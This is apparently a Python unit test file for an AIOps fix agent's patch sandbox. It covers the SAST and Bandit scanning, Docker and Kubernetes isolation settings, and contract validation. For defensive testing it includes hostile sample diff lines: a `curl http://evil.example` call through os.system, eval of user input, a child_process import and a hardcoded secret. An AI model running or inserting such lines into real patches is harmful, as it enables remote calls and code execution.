"""沙箱执行器单测（WP6）：隔离语义 / 输出解析 / 工作区准备 / K8s manifest / 真实容器集成。

运行：
    .venv/bin/python -m unittest discover -s tests -t . -v

说明：真实容器集成类需要本机 docker 与 python:3.12-slim 镜像，不可用时自动跳过。
"""

from __future__ import annotations

import json
import shutil
import subprocess
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from aiops_agent import code_rag, fix_agent, sandbox
from aiops_agent.models import Alert, Patch, RootCause

ROOT_CAUSE = RootCause(
    error_type="NullPointerException",
    suspect_files=["com/example/service/OrderService.java"],
    confidence=0.95,
    summary="coupon 空值未防护。",
)


def _patch_for(alert_id: str = "wp6-s1", attempt: int = 0, *, bad: bool = False) -> Patch:
    """基于 demo-app 真实文件构造补丁（与修复 Agent 演示分支同源）。"""
    alert = Alert(alert_id=alert_id, service="order", description="沙箱单测")
    return fix_agent.fallback_patch(alert, ROOT_CAUSE, attempt, "order_service.py", bad=bad)


class TestScanPatchDiff(unittest.TestCase):
    def test_flags_dangerous_patterns(self) -> None:
        diff = "--- a/x.py\n+++ b/x.py\n@@ -1 +1 @@\n+result = eval(user_input)\n"
        ok, detail = sandbox.scan_patch_diff(diff)
        self.assertFalse(ok)
        self.assertIn("eval()", detail)

    def test_clean_diff_passes_and_counts_added(self) -> None:
        ok, detail = sandbox.scan_patch_diff(_patch_for().diff)
        self.assertTrue(ok, detail)
        self.assertIn("已扫描", detail)

    def test_frontend_files_use_frontend_patterns(self) -> None:
        """前端补丁：regex.exec( / socket 变量 / requests 变量等 JS 常见写法不再误报。"""
        diff = (
            "--- a/src/util/parse.ts\n+++ b/src/util/parse.ts\n@@ -1,1 +1,3 @@\n"
            "+const m = pattern.exec(text);\n"
            "+const socket = io('/live');\n"
            "+const requests = items.map(toRequest);\n"
        )
        ok, detail = sandbox.scan_patch_diff(diff, files=["src/util/parse.ts"])
        self.assertTrue(ok, detail)
        self.assertIn("前端模式集", detail)

    def test_frontend_files_still_block_real_danger(self) -> None:
        """前端模式集仍拦截真实危险：动态执行 / Node 后门 / 硬编码口令。"""
        eval_diff = "--- a/x.ts\n+++ b/x.ts\n@@ -1 +1 @@\n+eval(userInput)\n"
        ok, detail = sandbox.scan_patch_diff(eval_diff, files=["x.ts"])
        self.assertFalse(ok)
        self.assertIn("eval()", detail)

        child_diff = "--- a/y.ts\n+++ b/y.ts\n@@ -1 +1 @@\n+const cp = require('child_process');\n"
        ok2, detail2 = sandbox.scan_patch_diff(child_diff, files=["y.ts"])
        self.assertFalse(ok2)
        self.assertIn("child_process", detail2)

        secret_diff = "--- a/z.ts\n+++ b/z.ts\n@@ -1 +1 @@\n+const apiKey = 'sk-live-123';\n"
        ok3, detail3 = sandbox.scan_patch_diff(secret_diff, files=["z.ts"])
        self.assertFalse(ok3)
        self.assertIn("硬编码敏感信息", detail3)

    def test_mixed_files_keep_default_patterns(self) -> None:
        """混合补丁（含非前端文件）沿用通用模式集：socket 等仍拦截。"""
        diff = "--- a/x.py\n+++ b/x.py\n@@ -1 +1 @@\n+import socket\n"
        ok, _ = sandbox.scan_patch_diff(diff, files=["x.py", "ui.tsx"])
        self.assertFalse(ok)


class TestParseUnittestOutput(unittest.TestCase):
    OK_OUTPUT = (
        "test_a (t.T) ... ok\n"
        "----------------------------------------------------------------------\n"
        "Ran 6 tests in 0.003s\n"
        "\nOK\n"
    )
    FAILED_OUTPUT = (
        "test_a (t.T) ... ok\n"
        "======================================================================\n"
        "ERROR: test_submit_without_coupon_code (test_order_service.TestOrderService)\n"
        "----------------------------------------------------------------------\n"
        "Traceback (most recent call last):\n"
        '  File "/work/tests/test_order_service.py", line 23, in test_submit_without_coupon_code\n'
        '    result = self.service.submit({"amount": 100})\n'
        "TypeError: 'NoneType' object is not subscriptable\n"
        "\n"
        "----------------------------------------------------------------------\n"
        "Ran 6 tests in 0.004s\n"
        "\nFAILED (errors=1)\n"
    )

    def test_ok_output(self) -> None:
        parsed = sandbox.parse_unittest_output(self.OK_OUTPUT)
        self.assertEqual(parsed["tests_run"], 6)
        self.assertEqual(parsed["failed_tests"], [])
        self.assertEqual(parsed["error_summary"], "")

    def test_failed_output(self) -> None:
        parsed = sandbox.parse_unittest_output(self.FAILED_OUTPUT)
        self.assertEqual(parsed["tests_run"], 6)
        self.assertEqual(parsed["failed_tests"], ["test_submit_without_coupon_code"])
        self.assertIn("TypeError", parsed["error_summary"])


class TestDockerSandboxRunner(unittest.TestCase):
    def test_isolation_flags(self) -> None:
        job = sandbox.SandboxJob(patch_id="p1", workspace=Path("/tmp/ws"))
        cmd = sandbox.DockerSandboxRunner()._build_cmd(job)
        self.assertEqual(cmd[0], "docker")
        self.assertIn("--rm", cmd)
        self.assertEqual(cmd[cmd.index("--network") + 1], "none")  # 无出网权限
        self.assertIn("--read-only", cmd)
        self.assertEqual(cmd[cmd.index("--memory") + 1], "256m")
        self.assertEqual(cmd[cmd.index("--cpus") + 1], "1")
        self.assertEqual(cmd[cmd.index("--pids-limit") + 1], "128")
        self.assertTrue(any(str(part).endswith(":/work:ro") for part in cmd))  # 制品只读挂载

    def test_run_parses_completed_process(self) -> None:
        job = sandbox.SandboxJob(patch_id="p2", workspace=Path("/tmp/ws"))
        proc = mock.Mock(returncode=0, stdout=b"", stderr=b"...\nRan 6 tests in 0.002s\n\nOK\n")
        with mock.patch("aiops_agent.sandbox.subprocess.run", return_value=proc) as run:
            outcome = sandbox.DockerSandboxRunner().run(job)
        self.assertTrue(outcome.passed)
        self.assertEqual(outcome.tests_run, 6)
        self.assertEqual(outcome.exit_code, 0)
        args, kwargs = run.call_args
        self.assertIsInstance(args[0], list)  # 参数列表调用（shell=False）
        self.assertFalse(kwargs.get("shell", False))

    def test_run_timeout_marks_failed(self) -> None:
        job = sandbox.SandboxJob(patch_id="p3", workspace=Path("/tmp/ws"), timeout_seconds=1)
        expired = subprocess.TimeoutExpired(cmd="docker", timeout=1)
        with mock.patch("aiops_agent.sandbox.subprocess.run", side_effect=expired):
            outcome = sandbox.DockerSandboxRunner().run(job)
        self.assertTrue(outcome.timed_out)
        self.assertFalse(outcome.passed)


class TestK8sManifest(unittest.TestCase):
    def test_manifest_gvisor_and_hardening(self) -> None:
        job = sandbox.SandboxJob(patch_id="p4", workspace=Path("/tmp/ws"))
        manifest = sandbox.K8sJobSandboxRunner().render_manifest(job)
        spec = manifest["spec"]["template"]["spec"]
        self.assertEqual(spec["runtimeClassName"], "gvisor")  # 用户态内核隔离
        self.assertEqual(spec["restartPolicy"], "Never")
        self.assertFalse(spec["automountServiceAccountToken"])
        self.assertTrue(spec["securityContext"]["runAsNonRoot"])
        self.assertEqual(manifest["spec"]["backoffLimit"], 0)
        self.assertEqual(manifest["spec"]["activeDeadlineSeconds"], job.timeout_seconds)
        container = spec["containers"][0]
        self.assertTrue(container["securityContext"]["readOnlyRootFilesystem"])
        self.assertFalse(container["securityContext"]["allowPrivilegeEscalation"])
        self.assertEqual(container["securityContext"]["capabilities"]["drop"], ["ALL"])
        self.assertEqual(container["resources"]["limits"]["memory"], "256Mi")
        self.assertTrue(container["volumeMounts"][0]["readOnly"])


class TestPrepareWorkspaceAndRunTests(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = Path(tempfile.mkdtemp(prefix="wp6-sandbox-test-"))

    def tearDown(self) -> None:
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_prepare_workspace_applies_diff(self) -> None:
        patch = _patch_for("wp6-prep")
        workspace, error = sandbox.prepare_workspace(patch, code_rag.DEFAULT_REPO_DIR, self.tmp)
        self.assertEqual(error, "")
        self.assertIsNotNone(workspace)
        content = (workspace / "order_service.py").read_text(encoding="utf-8")
        self.assertIn('discount = coupon["discount"] if coupon else 0', content)
        self.assertTrue((workspace / "tests" / "test_order_service.py").is_file())
        self.assertFalse(any(p.name == "__pycache__" for p in workspace.rglob("__pycache__")))

    def test_prepare_workspace_bad_context_reports_error(self) -> None:
        patch = _patch_for("wp6-bad-context")
        patch.diff = patch.diff.replace("code = payload", "code = vanished")  # 破坏上下文
        workspace, error = sandbox.prepare_workspace(patch, code_rag.DEFAULT_REPO_DIR, self.tmp)
        self.assertIsNone(workspace)
        self.assertIn("无法应用", error)

    def test_prepare_workspace_creates_new_file(self) -> None:
        """新增文件（--- /dev/null）：自动创建父目录并写入内容（需求实现常见形态）。"""
        patch = Patch(
            patch_id="wp6-newfile",
            alert_id="a-newfile",
            files=["utils/guard.py"],
            diff=(
                "--- /dev/null\n+++ b/utils/guard.py\n@@ -0,0 +1,2 @@\n"
                "+def guard(coupon):\n+    return coupon or 0\n"
            ),
            description="新增工具模块",
            risk="低",
            model_version="test",
            confidence=0.9,
        )
        workspace, error = sandbox.prepare_workspace(patch, code_rag.DEFAULT_REPO_DIR, self.tmp)
        self.assertEqual(error, "")
        self.assertIsNotNone(workspace)
        created = workspace / "utils" / "guard.py"
        self.assertTrue(created.is_file())
        self.assertIn("def guard", created.read_text(encoding="utf-8"))

    def test_run_patch_tests_maps_runner_outcome(self) -> None:
        patch = _patch_for("wp6-map")
        fake = mock.Mock()
        fake.run.return_value = sandbox.SandboxOutcome(
            exit_code=0,
            passed=True,
            tests_run=6,
            duration_seconds=0.5,
            runner="fake",
            image="python:3.12-slim",
        )
        report = sandbox.run_patch_tests(patch, 0, sandbox_root=self.tmp, runner=fake)
        self.assertTrue(report.passed)
        self.assertEqual(report.unit_tests, "6/6 passed")
        self.assertIn("demo-app/tests", report.regression_tests)
        job = fake.run.call_args[0][0]
        self.assertIsInstance(job, sandbox.SandboxJob)
        self.assertTrue((job.workspace / "order_service.py").is_file())

    def test_run_patch_tests_reports_failure_details(self) -> None:
        patch = _patch_for("wp6-fail", bad=True)
        fake = mock.Mock()
        fake.run.return_value = sandbox.SandboxOutcome(
            exit_code=1,
            passed=False,
            tests_run=6,
            duration_seconds=0.4,
            runner="fake",
            image="python:3.12-slim",
            failed_tests=["test_submit_without_coupon_code"],
            error_summary="TypeError: 'NoneType' object is not subscriptable",
        )
        report = sandbox.run_patch_tests(patch, 0, sandbox_root=self.tmp, runner=fake)
        self.assertFalse(report.passed)
        self.assertIn("5/6 passed", report.unit_tests)
        self.assertIn("test_submit_without_coupon_code", report.details)
        self.assertIn("TypeError", report.details)

    def test_run_patch_tests_sast_blocks_before_execution(self) -> None:
        patch = _patch_for("wp6-sast")
        patch.diff += "+os.system('curl http://evil.example')\n"
        runner = mock.Mock()
        report = sandbox.run_patch_tests(patch, 0, sandbox_root=self.tmp, runner=runner)
        self.assertFalse(report.passed)
        self.assertIn("SAST", report.unit_tests)
        runner.run.assert_not_called()

    def test_run_patch_tests_includes_bandit_detail(self) -> None:
        """真实端到端：sast 字段合并正则与 Bandit 两道结论（bandit 缺失时降级说明）。"""
        patch = _patch_for("wp6-bandit-e2e")
        fake = mock.Mock()
        fake.run.return_value = sandbox.SandboxOutcome(
            exit_code=0,
            passed=True,
            tests_run=6,
            duration_seconds=0.5,
            runner="fake",
            image="python:3.12-slim",
        )
        report = sandbox.run_patch_tests(patch, 0, sandbox_root=self.tmp, runner=fake)
        self.assertTrue(report.passed, report.details)
        self.assertIn("Bandit", report.sast)


class TestContractValidation(unittest.TestCase):
    """契约模式（前端仓库）：补丁应用成功即通过（2026-10-10 取消探针关键词判据）；降级补丁拦截。"""

    def setUp(self) -> None:
        self.tmp = Path(tempfile.mkdtemp(prefix="contract-test-"))
        self.repo = self.tmp / "fe-repo"
        (self.repo / "src" / "components" / "reports").mkdir(parents=True)
        (self.repo / "index.html").write_text(
            '<!doctype html><html><body><div id="root"></div></body></html>\n',
            encoding="utf-8",
        )
        self.component = "src/components/reports/ReportGenerator.tsx"
        (self.repo / self.component).write_text(
            "export const Report = () => null;\n", encoding="utf-8"
        )

    def tearDown(self) -> None:
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _patch(self, files: list[str], diff: str) -> Patch:
        return Patch(
            patch_id="p-contract-1",
            alert_id="a-contract",
            files=files,
            diff=diff,
            description="契约校验单测",
            risk="低",
            model_version="test",
            confidence=0.9,
        )

    def _run(self, patch: Patch, contract: dict | None = None) -> sandbox.TestReport:
        # contract 仅作模式开关：keyword 已不参与判据（传真实值与空值结果一致）
        return sandbox.run_patch_tests(
            patch,
            0,
            repo_dir=self.repo,
            sandbox_root=self.tmp,
            contract={"keyword": '<div id="root"'} if contract is None else contract,
        )

    def test_component_patch_passes_and_report_has_no_keyword(self) -> None:
        """功能类补丁（只改组件）→ 通过；报告不再出现探针关键词判据文案（取消回归防线）。"""
        diff = (
            f"--- a/{self.component}\n"
            f"+++ b/{self.component}\n"
            "@@ -1,1 +1,2 @@\n"
            " export const Report = () => null;\n"
            "+export const REFRESH_INTERVAL = 30_000;\n"
        )
        report = self._run(self._patch([self.component], diff))
        self.assertTrue(report.passed, report.details)
        self.assertIn("契约校验通过", report.unit_tests)
        self.assertNotIn("关键词", report.unit_tests)
        self.assertNotIn("关键词", report.details)

    def test_patch_touching_entry_page_passes(self) -> None:
        """修复入口页的补丁 → 通过（不再校验关键词「恢复」路径）。"""
        diff = (
            "--- a/index.html\n"
            "+++ b/index.html\n"
            "@@ -1,1 +1,1 @@\n"
            '-<!doctype html><html><body><div id="root"></div></body></html>\n'
            '+<!doctype html><html><body><div id="root"></div><script src="/main.js"></script></body></html>\n'
        )
        report = self._run(self._patch(["index.html"], diff))
        self.assertTrue(report.passed, report.details)
        self.assertIn("契约校验通过", report.unit_tests)

    def test_keyword_absence_no_longer_blocks(self) -> None:
        """未配置探针关键词 → 不再判「配置无效」；补丁应用成功即通过。"""
        diff = (
            f"--- a/{self.component}\n"
            f"+++ b/{self.component}\n"
            "@@ -1,1 +1,2 @@\n"
            " export const Report = () => null;\n"
            "+export const X = 1;\n"
        )
        report = self._run(self._patch([self.component], diff), contract={"keyword": ""})
        self.assertTrue(report.passed, report.details)

    def test_breaking_entry_page_not_statically_blocked(self) -> None:
        """破坏入口页的补丁 → 静态契约不再拦截（关键词判据已取消）；

        该类风险由直连发布的在线页面探针与金丝雀劣化自动回滚兜底
        （见 release.run_canary_direct / _page_probe_once）。
        """
        diff = (
            "--- a/index.html\n"
            "+++ b/index.html\n"
            "@@ -1,1 +1,1 @@\n"
            '-<!doctype html><html><body><div id="root"></div></body></html>\n'
            '+<!doctype html><html><body></body></html>\n'
        )
        report = self._run(self._patch(["index.html"], diff))
        self.assertTrue(report.passed, report.details)

    def test_degraded_patch_blocked(self) -> None:
        """生成降级（Qoder/LLM 失败兜底）的补丁仍拦截。"""
        diff = (
            f"--- a/{self.component}\n"
            f"+++ b/{self.component}\n"
            "@@ -1,1 +1,2 @@\n"
            " export const Report = () => null;\n"
            "+export const X = 1;\n"
        )
        patch = self._patch([self.component], diff)
        patch.degraded = True
        report = self._run(patch)
        self.assertFalse(report.passed)
        self.assertIn("降级", report.unit_tests)
        self.assertIn("降级", report.details)

    def test_requirement_patch_with_new_file_passes(self) -> None:
        """需求实现含新增组件文件（多文件补丁）→ 应用成功 → 放行。"""
        new_rel = "src/components/reports/ExportButton.tsx"
        diff = (
            f"--- a/{self.component}\n"
            f"+++ b/{self.component}\n"
            "@@ -1,1 +1,2 @@\n"
            " export const Report = () => null;\n"
            "+export const EXPORT_ENABLED = true;\n"
            "--- /dev/null\n"
            f"+++ b/{new_rel}\n"
            "@@ -0,0 +1,2 @@\n"
            "+export const ExportButton = () => null;\n"
            "+export const EXPORT_LABEL = '导出';\n"
        )
        report = self._run(self._patch([self.component, new_rel], diff))
        self.assertTrue(report.passed, report.details)
        self.assertIn("契约校验通过", report.unit_tests)
        self.assertTrue((self.tmp / "p-contract-1" / new_rel).is_file())


class TestBanditIntegration(unittest.TestCase):
    """Bandit 深度扫描（P2-04）：delta 拦截 / 既有问题豁免 / LOW 记录 / 降级放行。"""

    MEDIUM_ISSUE = {
        "test_id": "B602",
        "issue_severity": "MEDIUM",
        "issue_confidence": "HIGH",
        "issue_text": "subprocess call with shell=True",
        "line_number": 3,
    }

    def _scan_result(self, issues: list[dict]) -> mock.Mock:
        return mock.Mock(
            returncode=1 if issues else 0,
            stdout=json.dumps({"results": issues}).encode("utf-8"),
            stderr=b"",
        )

    def test_blocks_new_medium_issue(self) -> None:
        ws_issue = {**self.MEDIUM_ISSUE, "filename": "/ws/x.py"}
        with mock.patch("aiops_agent.sandbox.subprocess.run") as run:
            run.side_effect = [self._scan_result([ws_issue]), self._scan_result([])]
            ok, detail = sandbox.run_bandit(Path("/ws"), Path("/base"))
        self.assertFalse(ok)
        self.assertIn("Bandit 拦截", detail)
        self.assertIn("B602", detail)

    def test_existing_baseline_issue_not_blocked(self) -> None:
        base_issue = {**self.MEDIUM_ISSUE, "filename": "/base/a.py"}
        ws_issue = {**self.MEDIUM_ISSUE, "filename": "/ws/a.py"}
        with mock.patch("aiops_agent.sandbox.subprocess.run") as run:
            run.side_effect = [self._scan_result([ws_issue]), self._scan_result([base_issue])]
            ok, detail = sandbox.run_bandit(Path("/ws"), Path("/base"))
        self.assertTrue(ok, detail)
        self.assertIn("0 新增问题", detail)

    def test_new_low_issue_recorded_but_not_blocked(self) -> None:
        ws_issue = {
            **self.MEDIUM_ISSUE,
            "filename": "/ws/b.py",
            "test_id": "B101",
            "issue_severity": "LOW",
        }
        with mock.patch("aiops_agent.sandbox.subprocess.run") as run:
            run.side_effect = [self._scan_result([ws_issue]), self._scan_result([])]
            ok, detail = sandbox.run_bandit(Path("/ws"), Path("/base"))
        self.assertTrue(ok, detail)
        self.assertIn("LOW", detail)

    def test_unavailable_degrades_open(self) -> None:
        with mock.patch(
            "aiops_agent.sandbox.subprocess.run", side_effect=OSError("no bandit")
        ):
            ok, detail = sandbox.run_bandit(Path("/ws"), Path("/base"))
        self.assertTrue(ok)
        self.assertIn("未执行", detail)

    def test_baseline_unavailable_skips_blocking(self) -> None:
        ws_issue = {**self.MEDIUM_ISSUE, "filename": "/ws/x.py"}
        with mock.patch("aiops_agent.sandbox.subprocess.run") as run:
            run.side_effect = [
                self._scan_result([ws_issue]),
                subprocess.TimeoutExpired(cmd="bandit", timeout=30),
            ]
            ok, detail = sandbox.run_bandit(Path("/ws"), Path("/base"))
        self.assertTrue(ok, detail)
        self.assertIn("基线不可比", detail)


def _docker_available() -> bool:
    if not shutil.which("docker"):
        return False
    try:
        probe = subprocess.run(
            ["docker", "image", "inspect", sandbox.SANDBOX_IMAGE],
            capture_output=True,
            timeout=20,
        )
    except OSError:
        return False
    return probe.returncode == 0


@unittest.skipUnless(_docker_available(), "docker/镜像不可用，跳过真实容器集成")
class TestRealContainerIntegration(unittest.TestCase):
    """真实隔离容器执行：修复候选通过 / 错误候选被拦截 / 无出网权限。"""

    def test_good_patch_passes_and_bad_patch_blocked(self) -> None:
        good = _patch_for("wp6-int-good", bad=False)
        report = sandbox.run_patch_tests(good, 0)
        self.assertTrue(report.passed, report.details)
        self.assertEqual(report.unit_tests, "6/6 passed")

        bad = _patch_for("wp6-int-bad", bad=True)
        bad_report = sandbox.run_patch_tests(bad, 0)
        self.assertFalse(bad_report.passed)
        self.assertIn("test_submit_without_coupon_code", bad_report.details)
        self.assertIn("TypeError", bad_report.details)

    def test_network_is_disabled_in_container(self) -> None:
        job = sandbox.SandboxJob(
            patch_id="wp6-int-net",
            workspace=code_rag.DEFAULT_REPO_DIR,
            command=[
                "python",
                "-c",
                "import socket; socket.create_connection(('1.1.1.1', 53), 2)",
            ],
        )
        outcome = sandbox.DockerSandboxRunner().run(job)
        self.assertFalse(outcome.passed)
        self.assertNotEqual(outcome.exit_code, 0)


if __name__ == "__main__":
    unittest.main()
